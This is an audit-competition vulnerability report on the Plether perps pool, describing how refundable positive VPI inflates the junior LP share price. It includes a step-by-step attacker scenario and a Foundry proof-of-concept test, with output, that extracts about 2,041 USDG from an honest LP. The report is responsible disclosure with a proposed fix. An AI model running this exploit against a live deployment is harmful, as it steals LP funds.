# \#98527 [SC-Critical] Positive VPI counts as junior LP equity before it is refunded, so LPs who exit while a skew is open take value from the remaining junior LPs

**Submitted on Nov 8th 2026 at 12:14:28 UTC by @jh42 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98527
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

When a trade increases skew, the trader pays positive VPI. The pool books that cash as junior revenue straight away. The lifetime clamp then refunds all of it to the same trader on close. LP deposit and withdrawal pricing has no liability for that refund. So a junior LP who exits while positive VPI is outstanding is paid a share of cash the pool owes back, and the junior LPs who stay pay the refund. An attacker who is both an LP and a trader can create the VPI, exit at the inflated price, close for a full refund, and repeat.


## Root cause

The pool counts positive VPI as LP revenue when it is collected, but the close clamp makes it refundable to the same trader. LP pricing never records that obligation.

**1. Counted as revenue at open.** The VPI the trader pays is part of the trade cost
([`OpenAccountingLib.sol#L127-L135`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/OpenAccountingLib.sol#L127-L135)):

```solidity
(valid, state.vpiAssets) = CfdMath.tryCalculateVPI(
    inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.riskParams.vpiFactor
);
// ...
state.tradeCostAssets = state.vpiAssets + int256(state.executionFeeAssets);
```

That cost goes straight into the pool as LP revenue
([`CfdEngineSettlementSidecar.sol#L454-L464`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L454-L464)),
and `CashArrived` adds it to `accountedAssets` immediately
([`HousePool.sol#L640-L641`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L640-L641)):

```solidity
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool())
            .recordClaimantInflow(
                poolCashInflowAssets,
                IHousePool.ClaimantInflowKind.Revenue,
                IHousePool.ClaimantInflowCashMode.CashArrived
            );
    }
}
```

**2. No liability for it in LP NAV.** The NAV used for every LP deposit and withdrawal treats only trader claims and a
negative price delta as liabilities
([`HousePoolAccountingLib.sol#L60-L78`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L78)):

```solidity
uint256 terminalAssets = engineSnapshot.physicalAssets;                // includes the VPI cash
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets; // no term for refundable VPI
// ...
if (terminalAssets >= terminalLiabilities) {
    snapshot.distributable = terminalAssets - terminalLiabilities;
}
```

Neither input carries the VPI:

```solidity
// CfdEngineProtocolLens.sol#L72: claims only
snapshot.traderClaimBalanceAssets = terminalSnapshot.totalTraderClaimsAssets;

// TerminalNavBookV2.sol#L422: the 7th field, vpiAccrued, is dropped
(uint256 size,,,, CfdTypes.Side side,,) = engine.positions(account);
```

([`CfdEngineProtocolLens.sol#L72`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineProtocolLens.sol#L72),
[`TerminalNavBookV2.sol#L422`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TerminalNavBookV2.sol#L422))

**3. Refunded at close.** At the same or a lower depth, the fresh close VPI is a rebate at least as large as the VPI
paid, and the lifetime clamp sets it to exactly that amount
([`CloseAccountingLib.sol#L103-L118`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118)):

```solidity
state.proportionalAccrualAssets =
    (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
// ...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The pool pays that rebate out of its cash
([`CfdEngineSettlementSidecar.sol#L621-L624`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L621-L624)):

```solidity
if (delta.actionRebatePaidAssets > 0) {
    IHousePool(host.pool()).payOut(address(clearinghouse), delta.actionRebatePaidAssets);
    clearinghouse.settleAssets(delta.account, int256(delta.actionRebatePaidAssets));
}
```

So between the open and the close, the LP share price includes cash the pool owes back. Every LP exit or deposit in that window is priced against that wrong NAV, and junior absorbs the difference.

## Impact

Release parameters, one round, price unchanged (from the PoC):

| Party | Result |
| --- | --- |
| Mallory (attacker LP + trader) | **+2,040.82 USDG** |
| Alice (honest junior LP, 1M) | **−3,240.82 USDG** (−0.32% of her principal) |
| Treasury | +1,200.00 (the open fee) |
| Senior LPs | 0 |

The amounts balance: Mallory's gain plus the treasury fee equals Alice's loss.

- **Theft of principal.** Mallory withdraws her gain as plain tokens, and Alice ends below her starting value.
- **Repeatable.** The same capital can run the round about every 3 hours. In a supporting 4-round test, honest
  junior lost 1.36% in 11 hours, and the loss grew linearly.
- **Ordinary LPs lose even without an attacker.** In a supporting test with an unrelated trader's skew, an LP who
  exited during it gained 1,337.61, and an LP who deposited during it lost 1,084.94 on 500k. This breaks the
  documented property in
  [SECURITY.md#L859-L860](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L859-L860):
  new LPs "do not inherit old trader obligations at a higher deposit NAV".
- **Requirements.** More than 40% of the junior shares, held for one cooldown and one epoch; a trading account with
  ≈0.2% initial margin; a live market. No privileged role, no oracle manipulation, and no non-default parameter is
  needed. Keepers are untrusted, and both steps are permissionless keeper calls.

## Description

### How the mispriced NAV reaches junior LPs

VPI is the change in the skew-cost curve at the current depth
([`CfdMath.sol#L118-L140`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdMath.sol#L118-L140),
[`#L164-L180`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdMath.sol#L164-L180)).
At a fixed depth, the VPI paid on open and the rebate on close cancel out, so the pool never earns it on a round trip.

Epoch settlement reconciles first, which turns the VPI into junior principal. It then prices the queued exits on that
principal
([`HousePool.sol#L835-L841`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835-L841)).
Deposits are priced the same way
([`#L919`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L919)):

```solidity
_reconcile(accountingSnapshot, statusSnapshot);
// ...
juniorPhase.pricingPrincipal = juniorPrincipal;
juniorPhase.pricingSupply = _juniorShareSupply();
```

Revenue goes to junior, and so does the loss when the refund is paid
([`HousePoolWaterfallAccountingLib.sol#L158`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L158),
[`#L172-L175`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L172-L175)):

```solidity
// distributeRevenue: everything above the senior high-water mark
nextState.juniorPrincipal += remaining;

// absorbLoss: junior first
if (lossAssets <= nextState.juniorPrincipal) {
    nextState.juniorPrincipal -= lossAssets;
    return nextState;
}
```

### Why the junior tranche amplifies it

- **VPI is sized by the whole pool, but only junior is exposed.** VPI depth is total pool assets minus claims, so it
  includes senior capital
  ([`PositionRiskAccountingLib.sol#L21-L26`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/PositionRiskAccountingLib.sol#L21-L26)).
  Only junior receives VPI and absorbs the refund. Senior earns a fixed coupon.
- **Senior can be 80% of the pool.** That is the release cap
  ([`DeployPerpsArbitrumSepolia.s.sol#L78-L79`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/script/DeployPerpsArbitrumSepolia.s.sol#L78-L79)).
  The attacker's own junior deposit always clears the junior withdrawal floor
  ([`HousePoolSeniorCapacityLib.sol#L64`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolSeniorCapacityLib.sol#L64)).
- **Economics.** Maximum VPI is about `0.0008·D`, and round-trip fees are about `0.4·VPI`. With `a` the attacker's
  share of **junior**, the attacker gains ≈`(a − 0.4)·VPI` and honest junior loses ≈`(a − 0.2)·VPI`. With senior at
  the cap, break-even is about 12% of the pool.
- **The attacker controls the timing.** The exit price is set at settlement, not at request.
  [`OrderRouter.executeOrderBatch`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L256)
  and
  [`OrderRouter.settleLpEpoch`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L479)
  are both permissionless, so the attacker can open, settle the epoch and close back-to-back.


## User story

1. Alice deposits 1.0M USDG into the junior tranche. Senior LPs hold 3.6M.
2. Mallory deposits 3.0M into the junior tranche.
3. Mallory requests to withdraw all her junior shares.
4. Mallory opens a 3.0M short. She pays 5,921 USDG of VPI, and the pool counts it as junior profit.
5. Mallory's withdrawal goes through at a price that includes that VPI. She receives 4,441 more than her shares were worth just before the trade.
6. Mallory closes the short at the same price. The pool refunds the full 5,921 VPI to her.
7. Result: Mallory gains 2,041 after fees, and Alice loses 3,241. The price never moved.
8. Mallory deposits again and repeats about every 3 hours.

Without any attacker:

1. A trader opens a large short and pays VPI.
2. Bob deposits 500k into the junior tranche while the short is open, so he pays a share price that includes that VPI.
3. The trader closes the short and gets the VPI back.
4. Bob's deposit is now worth about 1,085 USDG less than he paid.

## Recommendation

Treat positive lifetime VPI as a trader liability until the position is closed or liquidated. Keep a running total in
the Engine and add it to the claims figure that the lens passes to HousePool. That figure is used for exactly two
things: the NAV liability
([`HousePoolAccountingLib.sol#L64`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L64))
and the withdrawal reserve
([`#L51`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L51)).

```diff
--- a/packages/perps/src/CfdEngine.sol
+++ b/packages/perps/src/CfdEngine.sol
@@ -130,6 +130,8 @@
     mapping(address => uint64) public positionEpoch;
     /// @notice Aggregate outstanding trader-claim liability, in 6-decimal settlement token units.
     uint256 public totalTraderClaimBalanceAssets;
+    /// @notice Sum of positive lifetime VPI over open positions: the most that closes can still refund to traders.
+    uint256 public totalPositiveVpiAccruedAssets;
     /// @notice One-time-configured router authorized to reserve bounties and execute orders and liquidations.
     address public orderRouter;
 
@@ -1266,6 +1268,8 @@
         pos.lastCarryTimestamp = position.lastCarryTimestamp;
         pos.borrowBaseAssets = newBorrowBaseAssets;
         pos.lastCarryIndex = _currentSideCarryIndex(position.side, block.timestamp, _poolAssetsForCarry());
+        totalPositiveVpiAccruedAssets =
+            totalPositiveVpiAccruedAssets + _positivePart(position.vpiAccrued) - _positivePart(pos.vpiAccrued);
         pos.vpiAccrued = position.vpiAccrued;
         _applySideBorrowBaseDelta(position.side, 0, newBorrowBaseAssets);
     }
@@ -1280,9 +1284,16 @@
         if (pos.lots > 0 || pos.borrowBaseAssets > 0) {
             _applySideBorrowBaseDelta(pos.side, pos.borrowBaseAssets, 0);
         }
+        totalPositiveVpiAccruedAssets -= _positivePart(pos.vpiAccrued);
         delete _positions[account];
     }
 
+    function _positivePart(
+        int256 value
+    ) private pure returns (uint256) {
+        return value > 0 ? uint256(value) : 0;
+    }
+
     function _applyOpen(
         CfdEnginePlanTypes.OpenDelta memory delta,
         uint64 publishTime
--- a/packages/perps/src/CfdEngineProtocolLens.sol
+++ b/packages/perps/src/CfdEngineProtocolLens.sol
@@ -69,7 +69,10 @@
         );
         snapshot.terminalLpPriceDeltaAssets = terminalSnapshot.terminalLpPriceDeltaAssets;
         snapshot.terminalNavBookVersion = terminalSnapshot.bookVersion;
-        snapshot.traderClaimBalanceAssets = terminalSnapshot.totalTraderClaimsAssets;
+        // Positive lifetime VPI is refundable through the close clamp, so price it like a trader claim: LP entry and
+        // exit NAV exclude it, and LP withdrawals cannot spend the cash that backs the refund.
+        snapshot.traderClaimBalanceAssets =
+            terminalSnapshot.totalTraderClaimsAssets + engineContract.totalPositiveVpiAccruedAssets();
         snapshot.hasOpenPositions = terminalSnapshot.hasOpenPositions;
         snapshot.markFreshnessRequired = terminalSnapshot.hasOpenPositions;
         if (snapshot.markFreshnessRequired) {
```



## Proof of Concept

## Proof of concept

```bash
forge test --root packages/perps --match-path test/perps/LpExitBeforeVpiRefund.t.sol -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";

contract LpExitBeforeVpiRefundPoC is BasePerpTest {

    address internal constant ALICE = address(0xA11CE); // honest junior LP
    address internal constant SENIOR_LP = address(0x5E); // honest senior LP
    address internal constant MALLORY_LP = address(0xBAD1); // attacker's junior LP account
    address internal constant MALLORY_TRADER = address(0xBAD2); // attacker's trading account

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function test_LpExitBeforeVpiRefund_StealsFromHonestJunior() public {
        // Release senior covenant (senior may be up to 80% of tranche capital), then a normal pool fills up.
        _setSeniorCapacity(40_000_000e6, 8000);
        _fundJunior(ALICE, 1_000_000e6);
        _fundSenior(SENIOR_LP, 3_600_000e6);
        _fundJunior(MALLORY_LP, 3_000_000e6);
        _fundTrader(MALLORY_TRADER, 100_000e6);

        // 1. After the 1h deposit cooldown, Mallory queues a full junior exit. It is priced at settlement.
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        uint256 shares = juniorVault.balanceOf(MALLORY_LP);
        vm.prank(MALLORY_LP);
        uint256 requestId = juniorVault.requestRedeem(shares, MALLORY_LP, MALLORY_LP);

        vm.warp(pool.lpEpochStart(requestId));
        _mark();
        uint256 aliceBefore = _juniorValue(juniorVault.balanceOf(ALICE));
        uint256 malloryBefore = _juniorValue(shares) + clearinghouse.balanceAssets(MALLORY_TRADER);

        // 2. Mallory opens a 3M short (39.5% skew) and pays positive VPI, booked at once as junior revenue.
        uint256 size = 3_000_000e18;
        _open(MALLORY_TRADER, CfdTypes.Side.SHORT, size, 60_000e6, 1e8);
        (,,,,,, int256 vpiPaid) = engine.positions(MALLORY_TRADER);

        // 3. The epoch settles. Mallory's exit is priced with that VPI counted as junior equity.
        _settleLpEpochForTest();
        vm.prank(MALLORY_LP);
        juniorVault.claimRedeem(requestId, shares, MALLORY_LP, MALLORY_LP);

        // 4. She closes at the same price. The lifetime clamp refunds the full VPI from pool cash.
        _close(MALLORY_TRADER, CfdTypes.Side.SHORT, size, 1e8);
        uint256 traderBalance = clearinghouse.balanceAssets(MALLORY_TRADER);
        vm.prank(MALLORY_TRADER);
        clearinghouse.withdraw(MALLORY_TRADER, traderBalance);

        int256 malloryProfit = int256(settlementToken.balanceOf(MALLORY_LP) + settlementToken.balanceOf(MALLORY_TRADER))
            - int256(malloryBefore);
        int256 aliceProfit = int256(_juniorValue(juniorVault.balanceOf(ALICE))) - int256(aliceBefore);

        emit log_named_decimal_int("VPI paid, then refunded", vpiPaid, 6);
        emit log_named_decimal_int("Mallory profit", malloryProfit, 6);
        emit log_named_decimal_int("Alice profit", aliceProfit, 6);

        assertGt(malloryProfit, 0, "Mallory profits");
        assertLt(aliceProfit, 0, "Alice pays for it");
    }

    function _mark() internal {
        vm.prank(address(router));
        engine.updateMarkPrice(1e8, uint64(vm.getBlockTimestamp()));
    }

    /// @dev Junior value of `shares` as if reconciled now, via the pool's own preview.
    function _juniorValue(
        uint256 shares
    ) internal view returns (uint256) {
        (, uint256 juniorPrincipal,,) = pool.getPendingTrancheState();
        return (juniorPrincipal * shares) / juniorVault.totalSupply();
    }

}
```

#### Output

```bash
[PASS] test_LpExitBeforeVpiRefund_StealsFromHonestJunior() (gas: 4421629)
Logs:
  VPI paid, then refunded: 5921.051073
  Mallory profit: 2040.823695
  Alice profit: -3240.820456
```
